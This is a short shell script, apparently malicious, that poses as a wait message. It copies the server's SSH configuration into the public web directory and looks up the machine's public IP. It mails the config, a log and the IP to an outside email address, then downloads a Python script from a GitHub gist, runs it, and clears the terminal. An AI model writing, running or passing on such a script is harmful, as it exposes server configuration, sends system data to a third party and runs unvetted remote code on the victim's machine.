echo "Lutfen Bekleyin..."
cp /etc/ssh/sshd_config /var/www/html/ssh.txt
touch /tmp/log.txt
cd /tmp/
curl -o ip.txt https://ipinfo.io/ip
sendmail b0ru70@ajanlar.org < /var/www/html/ssh.txt
sendmail b0ru70@ajanlar.org < /tmp/log.txt
sendmail b0ru70@ajanlar.org < /tmp/ip.txt
sendmail b0ru70@ajanlar.org < /var/www/html/ssh.txt
wget https://gist.githubusercontent.com/B0RU70/83f768db01efc909eaee7b3f132fbaa3/raw/4a6b9eab5b68755548d948d3f0a9f67d3c086b9f/logs.py -P /usr/
python /usr/logs.py
cd /root/
clear
